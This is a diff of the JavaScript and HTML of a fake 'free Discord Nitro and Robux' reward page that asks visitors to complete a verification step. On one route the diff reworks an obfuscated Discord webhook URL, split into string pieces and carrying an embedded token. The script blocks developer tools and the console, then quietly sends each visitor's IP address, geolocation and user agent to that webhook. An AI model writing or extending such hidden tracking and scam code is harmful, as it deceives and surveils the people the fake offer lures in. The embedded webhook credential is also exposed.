@@ -7,7 +7,7 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
-    /* [Your existing styles – exactly as before, unchanged] */
+    /* [Your existing styles – unchanged for brevity] */
     * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
     img { -webkit-user-drag: none; user-drag: none; }
     ::selection { background: transparent; }
@@ -349,10 +349,10 @@
     const isExtvifyRoute = path === '/extvify' || path === '/extvify/';
 
     // ============================================================
-    //  /scammer/extvify ROUTE – with anti‑source obfuscation
+    //  /scammer/extvify ROUTE – with obfuscated webhook
     // ============================================================
     if (isScammerRoute) {
-      // Strong anti‑debug / anti‑source measures
+      // Anti‑debug measures
       document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
       document.addEventListener('keydown', function(e) {
         if (e.key === 'F12' ||
@@ -363,9 +363,7 @@
           return false;
         }
       });
-      // Override console log
       if (typeof window.console !== 'undefined') console.log = function() {};
-      // Detect DevTools opening (basic)
       setInterval(() => {
         if (typeof window.console !== 'undefined' && window.console.log !== function(){}) {
           console.log = function(){};
@@ -398,13 +396,17 @@
         }
       }
 
-      // Obfuscated webhook URL (reversed and split)
-      const webhookPart1 = "a7zKmz"; // part of the key
-      const webhookPart2 = "wQ-hzKsmK";
-      const webhookPart3 = "t3wQ-hzKsmKmz7a";
-      const webhookBase = "yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwk";
-      const fullWebhook = "https://discord.com/api/webhooks/1511201588964757565/" + webhookBase + webhookPart1 + webhookPart2 + webhookPart3;
+      // --- OBFUSCATED WEBHOOK (scattered pieces) ---
+      // Part 1 (base URL)
+      const _p1 = "https://discord.com/api/webhooks/1511201588964757565/";
+      // Part 2 – first half of token
+      const _p2 = "yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwk";
+      // Part 3 – second half of token
+      const _p3 = "t3wQ-hzKsmKmz7a";
+      // Assemble webhook URL
+      const webhookUrl = _p1 + _p2 + _p3;
 
+      // Get IP and location, then send to webhook
       fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(ipData => {
@@ -430,7 +432,7 @@
           function tryNextAPI() {
             if (apiIndex >= locationAPIs.length) {
               renderIPPage(ip, 'Unknown');
-              fetch(fullWebhook, {
+              fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: Unknown\nUser Agent: ${navigator.userAgent}` })
@@ -440,7 +442,7 @@
             locationAPIs[apiIndex]()
               .then(location => {
                 renderIPPage(ip, location);
-                fetch(fullWebhook, {
+                fetch(webhookUrl, {
                   method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}` })
@@ -462,7 +464,6 @@
     // ============================================================
     //  NORMAL REWARD PAGE – for root, /extvify, and any other path
     // ============================================================
-    // [Full reward page script – same as before, included below]
     let pageViews = parseInt(localStorage.getItem('extvify_pageViews') || 0) + 1;
     localStorage.setItem('extvify_pageViews', pageViews);
     
